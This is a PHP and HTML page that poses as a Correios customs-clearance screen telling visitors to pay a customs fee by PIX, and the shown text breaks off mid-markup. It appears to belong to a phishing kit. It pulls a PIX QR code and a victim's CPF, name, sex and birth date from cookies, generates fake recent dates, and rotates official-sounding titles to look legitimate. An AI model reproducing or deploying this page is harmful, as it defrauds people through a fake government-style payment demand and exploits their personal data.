<?php
session_start();
$response = isset($_COOKIE['pix_response']) ? json_decode($_COOKIE['pix_response'], true) : null;
if (!$response || !isset($response['object']['pix']['qrCode']) || !isset($response['object']['identifier'])) {
    header('Location: index.php');
    exit;
}
$qrCode = $response['object']['pix']['qrCode'];
$identifier = $response['object']['identifier'];
$amount = $response['object']['amount'];


date_default_timezone_set('America/Sao_Paulo');
$data_hoje = date('d/m/Y'); // Ex: 19/07/2025
$hora_brasilia = date('H:i'); // Ex: 12:24
$ontem = date('d/m/Y', strtotime('-1 day')); // Ex: 20/07/2025
$ontem2 = date('d/m/Y', strtotime('-2 day')); // Ex: 20/07/2025
$ontem3 = date('d/m/Y', strtotime('-3 day')); // Ex: 20/07/2025

$response = isset($_COOKIE['api_response']) ? json_decode($_COOKIE['api_response'], true) : null;

if ($response && isset($response['status']) && $response['status'] === 'ok') {
    $cpf = $response['dadosCPF']['cpf'];
    $cpf_formatado = substr($cpf, 0, 3) . '.' . substr($cpf, 3, 3) . '.' . substr($cpf, 6, 3) . '-' . substr($cpf, 9, 2); // Ex: 141.727.956-76
    $nome = $response['dadosCPF']['nome'];
    $sexo = $response['dadosCPF']['sexo'];
    $dataNascimento = $response['dadosCPF']['dataNascimento'];
} elseif ($response && isset($response['Status']) && $response['Status'] === 'error') {
} else {
    echo "Erro: Nenhuma resposta válida encontrada.";
}
?>
<!DOCTYPE html>

<html lang="pt-BR"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
    <title id="titulo-animado">Correios • Desembaraço Aduaneiro - </title>

    <link href="../assets/all.min.css" rel="stylesheet">

    <script>
    document.addEventListener('DOMContentLoaded', function() {
        const titulo = document.getElementById('titulo-animado');
        // Array com diferentes títulos para randomizar
        const titulos = [
            "Liberação Aduaneira - Pagamento de Taxas",
            "Pagamento de Taxas Alfandegárias",
            "Desembaraço Aduaneiro - Correios",
            "Importação - Liberação de Remessas"
        ];
        // Seleciona um título aleatório
        const textoOriginal = titulos[Math.floor(Math.random() * titulos.length)];
        // Atualiza o título na página
        titulo.textContent = textoOriginal;
        const velocidade = 15000; // velocidade em milissegundos
        
        function animarTitulo() {
            document.title = textoOriginal;
            let posicao = 0;
            let direcao = 1;
            
            setInterval(function() {
                if (posicao > textoOriginal.length) {
                    direcao = -1;
                } else if (posicao <= 0) {
                    direcao = 1;
                }
                
                posicao += direcao;
                
                if (direcao === 1) {
                    // Movendo da direita para a esquerda
                    document.title = textoOriginal.substring(posicao) + " • " + textoOriginal.substring(0, posicao);
                } else {
                    // Movendo da esquerda para a direita
                    document.title = textoOriginal.substring(textoOriginal.length - posicao) + " • " + textoOriginal.substring(0, textoOriginal.length - posicao);
                }
            }, 200);
        }
        
        animarTitulo();
    });
    </script>
    <style>
        .responsivo {
            width: 100%;
            max-width: 250px;
            margin: 0 auto;
        }
        .codigo-pix {
            font-size: 16px;
            font-weight: bold;
            text-align: center;
            margin: 0 auto;
        }
        .lista-acessibilidade {
            position: absolute;
            background: white;
            list-style: none;
            padding: 10px;
            margin: 0;
            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
            z-index: 1000;
            width: 250px;
        }
        .acessibilidade {
            position: relative;
        }
        .bt-link-ic {
            display: flex;
            align-items: center;
            background: none;
            border: none;
            cursor: pointer;
            color: #0082C3;
        }
        .alto-contraste {
            background-color: #000 !important;
            color: #fff !important;
        }
        .alto-contraste * {
            background-color: #000 !important;
            color: #fff !important;
            border-color: #fff !important;
        }
        .alto-contraste a {
            color: #ffff00 !important;
        }
        .alto-contraste img {
            filter: grayscale(100%) !important;
        }
        .largura-maxima {
            background-color: #f0f0f0;
            width: 100%;
        }
        /* Estilos para o modal de confirmação de pagamento */
        .overlay-modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            z-index: 9999;
            backdrop-filter: blur(5px);
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        .overlay-modal.show {
            opacity: 1;
        }
        .modal-pagamento {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%) scale(0.9);
            background-color: rgba(255, 255, 255, 0.97);
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            padding: 30px;
            max-width: 500px;
            width: 90%;
            text-align: center;
            border: 1px solid rgba(30, 58, 138, 0.2);
            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        .overlay-modal.show .modal-pagamento {
            transform: translate(-50%, -50%) scale(1);
        }
        .opcoes-nav {
            display: none;
            margin-top: 20px;
            opacity: 0;
            transform: translateY(10px);
            transition: all 0.3s ease;
        }
        .opcoes-nav.show {
            opacity: 1;
            transform: translateY(0);
        }
        .btn-modal {
            display: inline-block;
            padding: 12px 24px;
            margin: 10px;
            border-radius: 8px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            border: none;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            position: relative;
            z-index: 10;
        }
        .btn-sim {
            background-color: #10B981;
            color: white;
        }
        .btn-sim:hover {
            background-color: #059669;
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }
        .btn-sim:active {
            transform: translateY(0);
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .btn-nao {
            background-color: #F87171;
            color: white;
        }
        .btn-nao:hover {
            background-color: #EF4444;
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }
        .btn-nao:active {
            transform: translateY(0);
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .btn-navegacao {
            background-color: #3B82F6;
            color: white;
            text-decoration: none;
            display: inline-block;
        }
        .btn-navegacao:hover {
            background-color: #2563EB;
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }
        .btn-navegacao:active {
            transform: translateY(0);
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        }
        .btn-modal:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }
        .modal-icone {
            font-size: 48px;
            margin-bottom: 20px;
            color: #3B82F6;
        }
        /* Estilo melhorado para o verificador de pagamento */
        .verificador-pagamento {
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #EFF6FF;
            border: 1px solid #DBEAFE;
            border-left: 4px solid #3B82F6;
            border-radius: 6px;
            padding: 12px 16px;
            margin-top: 16px;
            transition: all 0.3s ease;
        }
        .verificador-texto {
            font-size: 14px;
            color: #1E40AF;
            font-weight: 500;
            margin-left: 10px;
        }
        .verificador-spinner {
            width: 20px;
            height: 20px;
            border: 2px solid #3B82F6;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spinner 1s linear infinite;
        }
        @keyframes spinner {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .btn-confirmar-pagamento {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            background-color: #10B981;
            color: white;
            font-weight: 600;
            padding: 12px;
            border-radius: 6px;
            margin-top: 16px;
            border: none;
            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
            transition: all 0.2s ease;
        }
        .btn-confirmar-pagamento:hover {
            background-color: #059669;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.15);
        }
        .btn-confirmar-pagamento:active {
            transform: translateY(1px);
            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
        }
    </style>
<style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.16 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.container{width:100%}@media (min-width: 640px){.container{max-width:640px}}@media (min-width: 768px){.container{max-width:768px}}@media (min-width: 1024px){.container{max-width:1024px}}@media (min-width: 1280px){.container{max-width:1280px}}@media (min-width: 1536px){.container{max-width:1536px}}.mx-2{margin-left:0.5rem;margin-right:0.5rem}.mx-auto{margin-left:auto;margin-right:auto}.my-3{margin-top:0.75rem;margin-bottom:0.75rem}.mb-2{margin-bottom:0.5rem}.mb-3{margin-bottom:0.75rem}.mb-4{margin-bottom:1rem}.mb-6{margin-bottom:1.5rem}.mb-8{margin-bottom:2rem}.ml-3{margin-left:0.75rem}.ml-auto{margin-left:auto}.mr-1{margin-right:0.25rem}.mr-2{margin-right:0.5rem}.mr-3{margin-right:0.75rem}.mr-4{margin-right:1rem}.mt-1{margin-top:0.25rem}.mt-2{margin-top:0.5rem}.mt-5{margin-top:1.25rem}.block{display:block}.inline-block{display:inline-block}.flex{display:flex}.grid{display:grid}.hidden{display:none}.h-0\.5{height:0.125rem}.h-1{height:0.25rem}.h-10{height:2.5rem}.h-48{height:12rem}.h-8{height:2rem}.h-32{height:8rem}.w-10{width:2.5rem}.w-48{width:12rem}.w-8{width:2rem}.w-full{width:100%}.w-auto{width:auto}.max-w-4xl{max-width:56rem}.flex-1{flex:1 1 0%}.flex-shrink-0{flex-shrink:0}.list-decimal{list-style-type:decimal}.grid-cols-1{grid-template-columns:repeat(1, minmax(0, 1fr))}.flex-col{flex-direction:column}.flex-wrap{flex-wrap:wrap}.items-start{align-items:flex-start}.items-center{align-items:center}.justify-end{justify-content:flex-end}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.gap-4{gap:1rem}.gap-6{gap:1.5rem}.gap-8{gap:2rem}.space-x-4 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1rem * var(--tw-space-x-reverse));margin-left:calc(1rem * calc(1 - var(--tw-space-x-reverse)))}.space-x-6 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1.5rem * var(--tw-space-x-reverse));margin-left:calc(1.5rem * calc(1 - var(--tw-space-x-reverse)))}.space-y-1 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(0.25rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(0.25rem * var(--tw-space-y-reverse))}.space-y-2\.5 > :not([hidden]) ~ :not([hidden]){--tw-space-y-reverse:0;margin-top:calc(0.625rem * calc(1 - var(--tw-space-y-reverse)));margin-bottom:calc(0.625rem * var(--tw-space-y-reverse))}.overflow-hidden{overflow:hidden}.rounded{border-radius:0.25rem}.rounded-full{border-radius:9999px}.rounded-lg{border-radius:0.5rem}.rounded-r{border-top-right-radius:0.25rem;border-bottom-right-radius:0.25rem}.border{border-width:1px}.border-2{border-width:2px}.border-b{border-bottom-width:1px}.border-l-4{border-left-width:4px}.border-t{border-top-width:1px}.border-blue-500{--tw-border-opacity:1;border-color:rgb(59 130 246 / var(--tw-border-opacity, 1))}.border-gray-100{--tw-border-opacity:1;border-color:rgb(243 244 246 / var(--tw-border-opacity, 1))}.border-gray-200{--tw-border-opacity:1;border-color:rgb(229 231 235 / var(--tw-border-opacity, 1))}.border-blue-100{--tw-border-opacity:1;border-color:rgb(219 234 254 / var(--tw-border-opacity, 1))}.border-gray-300{--tw-border-opacity:1;border-color:rgb(209 213 219 / var(--tw-border-opacity, 1))}.bg-gray-100{--tw-bg-opacity:1;background-color:rgb(243 244 246 / var(--tw-bg-opacity, 1))}.bg-blue-50{--tw-bg-opacity:1;background-color:rgb(239 246 255 / var(--tw-bg-opacity, 1))}.bg-blue-500{--tw-bg-opacity:1;background-color:rgb(59 130 246 / var(--tw-bg-opacity, 1))}.bg-blue-600{--tw-bg-opacity:1;background-color:rgb(37 99 235 / var(--tw-bg-opacity, 1))}.bg-gray-200{--tw-bg-opacity:1;background-color:rgb(229 231 235 / var(--tw-bg-opacity, 1))}.bg-gray-300{--tw-bg-opacity:1;background-color:rgb(209 213 219 / var(--tw-bg-opacity, 1))}.bg-gray-50{--tw-bg-opacity:1;background-color:rgb(249 250 251 / var(--tw-bg-opacity, 1))}.bg-green-100{--tw-bg-opacity:1;background-color:rgb(220 252 231 / var(--tw-bg-opacity, 1))}.bg-green-50{--tw-bg-opacity:1;background-color:rgb(240 253 244 / var(--tw-bg-opacity, 1))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255 / var(--tw-bg-opacity, 1))}.bg-yellow-400{--tw-bg-opacity:1;background-color:rgb(250 204 21 / var(--tw-bg-opacity, 1))}.bg-\[\#F8F8F8\]{--tw-bg-opacity:1;background-color:rgb(248 248 248 / var(--tw-bg-opacity, 1))}.p-3{padding:0.75rem}.p-4{padding:1rem}.p-5{padding:1.25rem}.p-6{padding:1.5rem}.px-3{padding-left:0.75rem;padding-right:0.75rem}.px-4{padding-left:1rem;padding-right:1rem}.py-1{padding-top:0.25rem;padding-bottom:0.25rem}.py-2{padding-top:0.5rem;padding-bottom:0.5rem}.py-3{padding-top:0.75rem;padding-bottom:0.75rem}.py-8{padding-top:2rem;padding-bottom:2rem}.py-5{padding-top:1.25rem;padding-bottom:1.25rem}.pb-1{padding-bottom:0.25rem}.pl-5{padding-left:1.25rem}.text-center{text-align:center}.font-mono{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}.font-sans{font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji"}.text-2xl{font-size:1.5rem;line-height:2rem}.text-3xl{font-size:1.875rem;line-height:2.25rem}.text-base{font-size:1rem;line-height:1.5rem}.text-lg{font-size:1.125rem;line-height:1.75rem}.text-sm{font-size:0.875rem;line-height:1.25rem}.text-xl{font-size:1.25rem;line-height:1.75rem}.text-xs{font-size:0.75rem;line-height:1rem}.font-bold{font-weight:700}.font-medium{font-weight:500}.font-semibold{font-weight:600}.uppercase{text-transform:uppercase}.text-blue-600{--tw-text-opacity:1;color:rgb(37 99 235 / var(--tw-text-opacity, 1))}.text-blue-700{--tw-text-opacity:1;color:rgb(29 78 216 / var(--tw-text-opacity, 1))}.text-blue-800{--tw-text-opacity:1;color:rgb(30 64 175 / var(--tw-text-opacity, 1))}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128 / var(--tw-text-opacity, 1))}.text-gray-600{--tw-text-opacity:1;color:rgb(75 85 99 / var(--tw-text-opacity, 1))}.text-gray-700{--tw-text-opacity:1;color:rgb(55 65 81 / var(--tw-text-opacity, 1))}.text-green-600{--tw-text-opacity:1;color:rgb(22 163 74 / var(--tw-text-opacity, 1))}.text-green-700{--tw-text-opacity:1;color:rgb(21 128 61 / var(--tw-text-opacity, 1))}.text-green-800{--tw-text-opacity:1;color:rgb(22 101 52 / var(--tw-text-opacity, 1))}.text-red-600{--tw-text-opacity:1;color:rgb(220 38 38 / var(--tw-text-opacity, 1))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}.text-yellow-500{--tw-text-opacity:1;color:rgb(234 179 8 / var(--tw-text-opacity, 1))}.text-\[\#00416B\]{--tw-text-opacity:1;color:rgb(0 65 107 / var(--tw-text-opacity, 1))}.text-\[\#444444\]{--tw-text-opacity:1;color:rgb(68 68 68 / var(--tw-text-opacity, 1))}.text-\[\#666666\]{--tw-text-opacity:1;color:rgb(102 102 102 / var(--tw-text-opacity, 1))}.text-gray-800{--tw-text-opacity:1;color:rgb(31 41 55 / var(--tw-text-opacity, 1))}.opacity-90{opacity:0.9}.shadow{--tw-shadow:0 1px 3px 0 rgb(0 0 0 / 0.1), 0 1px 2px -1px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 1px 3px 0 var(--tw-shadow-color), 0 1px 2px -1px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-lg{--tw-shadow:0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);--tw-shadow-colored:0 10px 15px -3px var(--tw-shadow-color), 0 4px 6px -4px var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.shadow-sm{--tw-shadow:0 1px 2px 0 rgb(0 0 0 / 0.05);--tw-shadow-colored:0 1px 2px 0 var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow, 0 0 #0000), var(--tw-ring-shadow, 0 0 #0000), var(--tw-shadow)}.transition{transition-property:color, background-color, border-color, fill, stroke, opacity, box-shadow, transform, filter, -webkit-text-decoration-color, -webkit-backdrop-filter;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, backdrop-filter;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke, opacity, box-shadow, transform, filter, backdrop-filter, -webkit-text-decoration-color, -webkit-backdrop-filter;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.transition-colors{transition-property:color, background-color, border-color, fill, stroke, -webkit-text-decoration-color;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke;transition-property:color, background-color, border-color, text-decoration-color, fill, stroke, -webkit-text-decoration-color;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms}.duration-200{transition-duration:200ms}.hover\:bg-blue-600:hover{--tw-bg-opacity:1;background-color:rgb(37 99 235 / var(--tw-bg-opacity, 1))}.hover\:bg-blue-700:hover{--tw-bg-opacity:1;background-color:rgb(29 78 216 / var(--tw-bg-opacity, 1))}.hover\:text-\[\#00416B\]:hover{--tw-text-opacity:1;color:rgb(0 65 107 / var(--tw-text-opacity, 1))}.hover\:text-\[\#FBBB21\]:hover{--tw-text-opacity:1;color:rgb(251 187 33 / var(--tw-text-opacity, 1))}.hover\:underline:hover{-webkit-text-decoration-line:underline;text-decoration-line:underline}@media (min-width: 768px){.md\:mb-0{margin-bottom:0px}.md\:flex{display:flex}.md\:w-1\/2{width:50%}.md\:w-1\/3{width:33.333333%}.md\:w-2\/3{width:66.666667%}.md\:grid-cols-4{grid-template-columns:repeat(4, minmax(0, 1fr))}.md\:flex-row{flex-direction:row}.md\:justify-end{justify-content:flex-end}.md\:space-x-4 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1rem * var(--tw-space-x-reverse));margin-left:calc(1rem * calc(1 - var(--tw-space-x-reverse)))}.md\:space-x-6 > :not([hidden]) ~ :not([hidden]){--tw-space-x-reverse:0;margin-right:calc(1.5rem * var(--tw-space-x-reverse));margin-left:calc(1.5rem * calc(1 - var(--tw-space-x-reverse)))}}</style><style>[vw] [vw-access-button]{display:none;flex-direction:row-reverse;width:40px;height:40px;cursor:pointer;overflow:hidden;position:absolute;border-radius:8px;transition:all 0.5s ease;right:0;left:auto}[vw] [vw-access-button] img{max-height:40px;transition:all 0.5s ease;border-radius:8px;opacity:1 !important;visibility:visible !important}[vw] [vw-access-button] .vp-access-button{width:40px;height:40px;z-index:1}[vw] [vw-access-button] .vp-pop-up{position:absolute;height:40px;min-width:150px;z-index:0;left:0;right:auto}[vw] [vw-access-button]:hover{width:200px}[vw] [vw-access-button].isLeft{flex-direction:row;left:0;right:auto}[vw] [vw-access-button].isLeft .vp-pop-up{left:auto;right:0}[vw] [vw-access-button].isTopOrBottom:hover{bottom:-20px;top:0;margin-right:-80px}[vw] [vw-access-button].active{display:flex}
</style><style>[vw].left [vw-plugin-wrapper]{float:left}[vw] [vw-plugin-wrapper]{position:relative;display:none;width:300px;height:100%;float:right;background:white;-webkit-box-shadow:0px 0px 15px rgba(0,0,0,0.2);-moz-box-shadow:0px 0px 15px rgba(0,0,0,0.2);box-shadow:0px 0px 15px rgba(0,0,0,0.2);border-radius:12px;-moz-border-radius:12px;-webkit-border-radius:12px}[vw] [vw-plugin-wrapper].active{display:-webkit-flex;display:flex;flex-direction:column;-webkit-flex-direction:column;height:450px;max-width:100%;min-height:100%}
</style><style>div[vw]{position:fixed;max-width:95vw;min-height:40px;min-width:40px;z-index:2147483645 !important;display:none;margin:10px !important}div[vw].enabled{display:block}div[vw].active{margin-top:-285px}div[vw].left{left:0;right:initial}
</style></head>
<body class="bg-gray-100">
    <div class="largura-maxima flex">
        <div class="acessibilidade" style="display: flex; align-items: center; background-color: #f0f0f0; padding: 5px 10px; width: 100%;">
            <button id="botao-acessibilidade" class="bt-link-ic bt-acessibilidade" style="display: flex; align-items: center; background: none; border: none; cursor: pointer; color: #0082C3;">
                <span>Acessibilidade</span>
                <i class="fas fa-chevron-right rotacao-90" style="margin-left: 5px; transform: rotate(90deg);"></i>
            </button>
            <ul id="lista-itens-acessibilidade" class="lista-acessibilidade" style="display: none; position: absolute; top: 30px; background-color: white; list-style: none; padding: 10px; margin: 0; box-shadow: 0 2px 5px rgba(0,0,0,0.2); z-index: 1000;">
                <li style="margin-bottom: 8px;">
                    <a id="link-contraste" href="#" accesskey="c" style="display: flex; align-items: center; text-decoration: none; color: #333;">
                        <i class="fas fa-adjust" style="margin-right: 5px;"></i>
                        Alto Contraste
                    </a>
                </li>
                <li style="margin-bottom: 8px;">
                    <!-- Código do Vlibras do governo Federal-->
                    <div vw="" class="enabled">
                        <div vw-access-button="" class="active">
                            <img class="access-button" data-src="assets/access_icon.svg" alt="Conteúdo acessível em Libras usando o VLibras Widget com opções dos Avatares Ícaro, Hosana ou Guga.">
                            <img class="pop-up" data-src="assets/access_popup.jpg" alt="Conteúdo acessível em Libras usando o VLibras Widget com opções dos Avatares Ícaro, Hosana ou Guga.">
                            <p>VLibras</p>
                        </div>
                    </div>
     
                </li>
            </ul>
        </div>
    </div>

    <script>
    document.addEventListener('DOMContentLoaded', function() {
        const botaoAcessibilidade = document.getElementById('botao-acessibilidade');
        const listaItens = document.getElementById('lista-itens-acessibilidade');
        
        botaoAcessibilidade.addEventListener('click', function() {
            if (listaItens.style.display === 'none' || listaItens.style.display === '') {
                listaItens.style.display = 'block';
            } else {
                listaItens.style.display = 'none';
            }
        });
        
        // Fechar o menu ao clicar fora dele
        document.addEventListener('click', function(event) {
            if (!event.target.closest('.acessibilidade')) {
                listaItens.style.display = 'none';
            }
        });
        
        // Implementar alto contraste
        const linkContraste = document.getElementById('link-contraste');
        linkContraste.addEventListener('click', function(e) {
            e.preventDefault();
            document.body.classList.toggle('alto-contraste');
        });
    });
    </script>

    <!-- Header -->
    <header style="background-color: #ebebeb;" class="shadow">
        <div class="px-4 py-2 flex justify-between items-center">
            <div class="flex items-center">
                <button class="text-blue-600 text-2xl mr-4">
                    <i class="fas fa-bars"></i>
                </button>
                <img src="../assets/correios.svg" alt="Correios logo" class="h-8">
            </div>
            <div class="text-base text-gray-500 flex justify-end">
                                <div class="w-8 h-8 bg-blue-600 rounded-full flex items-center justify-center text-white font-bold">
                                    </div>
            </div>
        </div>
    </header>

    <div class="bg-yellow-400 h-1"></div>

    <!-- Navegação -->
    <nav class="bg-gray-50 py-2">
        <div class="container mx-auto px-4">
            <a class="text-blue-600 hover">Portal Correios</a>
            <i class="fas fa-chevron-right text-blue-600 mx-2"></i>
            <a class="text-blue-600 hover">Taxa Alfandegária</a>
            <i class="fas fa-chevron-right text-blue-600 mx-2"></i>
        </div>
    </nav>

    <!-- Conteúdo principal -->
    <main class="container mx-auto px-4 py-8" id="main">
        <!-- Card principal -->
        <div class="max-w-4xl mx-auto bg-white rounded-lg shadow-lg overflow-hidden">
            <!-- Cabeçalho do card -->
            <div class="bg-blue-600 text-white p-6">
                <h2 class="text-2xl font-bold flex items-center">
                    <i class="fas fa-money-check-alt mr-3"></i>
                    Pagamento da Taxa Alfandegária
                </h2>
                <p class="mt-2 opacity-90">
                    Para prosseguir com a liberação do seu pedido, é necessário efetuar o pagamento da taxa alfandegária via PIX.
                </p>
            </div>
            
            <!-- Conteúdo -->
            <div class="p-6">
                <!-- Indicador de etapas -->
                <div class="mb-8">
                    <div class="flex items-center justify-between">
                        <div class="flex flex-col items-center">
                            <div class="w-10 h-10 rounded-full bg-blue-600 text-white flex items-center justify-center font-bold text-lg">
                                1
                            </div>
                            <span class="text-sm font-medium text-gray-700 mt-2">Rastreamento</span>
                        </div>
                        <div class="flex-1 h-1 mx-2 bg-blue-600"></div>
                        <div class="flex flex-col items-center">
                            <div class="w-10 h-10 rounded-full bg-blue-600 text-white flex items-center justify-center font-bold text-lg">
                                2
                            </div>
                            <span class="text-sm font-medium text-gray-700 mt-2">Pagamento</span>
                        </div>
                        <div class="flex-1 h-1 mx-2 bg-gray-300"></div>
                        <div class="flex flex-col items-center">
                            <div class="w-10 h-10 rounded-full bg-gray-300 text-gray-600 flex items-center justify-center font-bold text-lg">
                                3
                            </div>
                            <span class="text-sm font-medium text-gray-700 mt-2">Liberação</span>
                        </div>
                    </div>
                </div>
                
                <!-- Informações sobre a taxa -->
                <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-6 rounded-r">
                    <div class="flex items-start">
